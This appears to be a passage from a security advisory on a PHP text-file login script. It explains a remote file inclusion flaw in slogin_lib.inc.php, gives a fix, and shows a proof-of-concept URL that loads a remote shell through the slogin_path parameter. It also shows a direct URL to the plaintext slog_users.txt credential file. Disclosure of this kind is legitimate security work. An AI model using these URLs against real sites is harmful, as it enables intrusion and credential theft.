* The name of this login system is Simple Text-File Login script, so we can already
  understand that this script will use a .txt file to do his job. So it's like if
  the coder didn't think that a login system like this isn't vulnerable. Weird !
  Anyway, it's vulnerable to Remote File Inclusion also, here we are !

[0x02] Bug:[Remote File Inclusion]
######

Bugged file is: /[path]/slogin_lib.inc.php

[CODE]
90.  if (!isset ($slogin_path)) {
91.    $slogin_path = "";
92. }
[/CODE]

If $slogin_path is not given, becomes a null variable. Scrolling down the source code,
you can see an include of that variable everywhere.
Just one of the few vulnerable includes:

[CODE] include_once ($slogin_path . "header.inc.php"); [/CODE]

FIX: Just declare $slogin_path. An example of a bugged inclusion in the source is this:

[CODE] include_once ($slogin_path . "header.inc.php"); [/CODE]

The header.inc.php file, such as all the files of this cms, is in the same dir of
slogin_lib.inc.php, so a fix could be just to include the file, without including
a variable, which should be null becouse all the files are in the same dir.

[CODE] include_once ("header.inc.php"); # <-- This is a secure include. [/CODE]


[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]

[0x03] Bug:[Sensitive Data Disclosure]
######

* As I already said, this is not a real bug, becouse is the intention of the author
  to use a .txt file as a login storage. But it's weird, it's unsecure ! Maybe he just
  sees the goodness of people (hehe xD)

In this login system, sensible datas like username and password are stored in a local
text file , so we can get sensitive information just going to this txt file . The name of
this file is set in slogin_lib.inc.php. By default is: slog_users.txt

[!] EXPLOIT: /[path]/slog_users.txt
